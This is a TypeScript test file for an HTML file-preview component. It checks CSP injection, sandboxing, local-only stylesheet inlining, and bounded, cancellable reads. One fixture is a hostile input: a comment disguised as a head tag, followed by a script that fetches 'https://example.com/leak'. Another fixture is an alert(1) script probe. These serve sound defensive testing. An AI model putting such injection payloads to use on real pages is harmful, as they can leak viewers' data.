import { test } from "node:test";
import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { htmlPreviewSource, inlinePreviewStyles } from "../src/web/components/FileWorkspace.tsx";

test("HTML preview prefixes a restrictive CSP before an existing head", () => {
  const source = htmlPreviewSource("<!doctype html><html><head><title>x</title></head><body>ok</body></html>");
  assert.match(source, /Content-Security-Policy/);
  assert.match(source, /default-src 'none'/);
  assert.match(source, /connect-src 'none'/);
  const script = source.match(/<script>([^<]+)<\/script>/)?.[1];
  assert.ok(script);
  const hash = createHash("sha256").update(script).digest("base64");
  assert.match(source, new RegExp(`script-src 'sha256-${hash}'`));
  assert.match(source, /form-action 'none'/);
  assert.match(source, /navigate-to 'none'/);
  assert.ok(source.indexOf("Content-Security-Policy") < source.indexOf("<title>"));
});

test("HTML fragments stay opaque and authorize only the scroll bridge", () => {
  const source = htmlPreviewSource("<h1>Hello</h1><script>alert(1)</script>");
  assert.match(source, /^<!doctype html><meta http-equiv="Content-Security-Policy"/);
  assert.doesNotMatch(source, /allow-same-origin/);
  assert.match(source, /event\.source===parent/);
  assert.match(source, /mission:file-preview-scroll/);
});

test("a head-looking comment cannot swallow the preview CSP or scroll bridge", () => {
  const hostile = '<!-- <head> --><script>fetch("https://example.com/leak")</script>';
  const source = htmlPreviewSource(hostile);
  assert.ok(source.indexOf("Content-Security-Policy") < source.indexOf(hostile));
  assert.ok(source.indexOf("mission:file-preview-scroll") < source.indexOf(hostile));
});

test("checkout-local stylesheets are inlined without weakening the preview CSP", async () => {
  const reads: string[] = [];
  const source = '<html><head><link rel="stylesheet" href="theme.css"></head><body>ok</body></html>';
  const hydrated = await inlinePreviewStyles(source, "docs/mockups/index.html", async (path) => {
    reads.push(path);
    return ":root { --bg: #111; }";
  });
  assert.deepEqual(reads, ["docs/mockups/theme.css"]);
  assert.doesNotMatch(hydrated, /<link/);
  assert.match(hydrated, /data-mission-source="docs\/mockups\/theme\.css"/);
  assert.match(hydrated, /--bg: #111/);
  const preview = htmlPreviewSource(hydrated);
  assert.match(preview, /style-src 'unsafe-inline'/);
  assert.doesNotMatch(preview, /allow-same-origin/);
});

test("unquoted local stylesheet attributes are inlined", async () => {
  const source = "<html><head><link rel=stylesheet href=theme.css></head><body>ok</body></html>";
  const hydrated = await inlinePreviewStyles(source, "docs/index.html", async (path) => (
    path === "docs/theme.css" ? "body { color: green; }" : null
  ));
  assert.doesNotMatch(hydrated, /<link/);
  assert.match(hydrated, /body \{ color: green; \}/);
});

test("remote stylesheets are neither fetched nor inlined", async () => {
  let read = false;
  const source = '<link rel="stylesheet" href="https://example.com/theme.css"><h1>ok</h1>';
  const hydrated = await inlinePreviewStyles(source, "index.html", async () => {
    read = true;
    return "";
  });
  assert.equal(read, false);
  assert.equal(hydrated, source);
});

test("stylesheet reads are deduplicated and concurrency-bounded", async () => {
  let active = 0;
  let peak = 0;
  const reads: string[] = [];
  const links = Array.from({ length: 40 }, (_, index) => (
    `<link rel="stylesheet" href="${index % 2 === 0 ? "shared" : `theme-${index}`}.css">`
  )).join("");
  await inlinePreviewStyles(links, "index.html", async (path) => {
    reads.push(path);
    active++;
    peak = Math.max(peak, active);
    await Promise.resolve();
    active--;
    return "body {}";
  });
  assert.equal(reads.filter((path) => path === "shared.css").length, 1);
  assert.ok(reads.length <= 32);
  assert.ok(peak <= 4);
});

test("obsolete stylesheet batches stop scheduling reads", async () => {
  const abort = new AbortController();
  let reads = 0;
  const links = Array.from({ length: 20 }, (_, index) => (
    `<link rel="stylesheet" href="theme-${index}.css">`
  )).join("");
  const hydrated = await inlinePreviewStyles(links, "index.html", async () => {
    reads++;
    abort.abort();
    return "body {}";
  }, abort.signal);
  assert.equal(hydrated, links);
  assert.ok(reads <= 4);
});
